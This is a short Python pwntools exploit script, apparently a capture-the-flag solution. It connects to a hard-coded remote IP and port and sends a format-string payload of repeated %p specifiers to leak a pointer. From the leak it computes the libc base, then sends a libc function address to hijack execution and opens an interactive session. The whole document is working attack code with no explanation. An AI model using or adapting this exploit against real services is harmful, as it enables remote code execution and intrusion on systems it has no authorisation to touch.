from pwn import *

io = remote("109.233.56.90", 11631)


io.recvuntil(b'Payload: ')
io.sendline(b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p.....%p')
io.recvuntil(b".....")
leak = int(io.recvline(), 16)
libc = leak - 0x0270b3
io.sendafter(b"Address (as hex): ", hex(libc + 0x55410)[2:])

io.interactive()
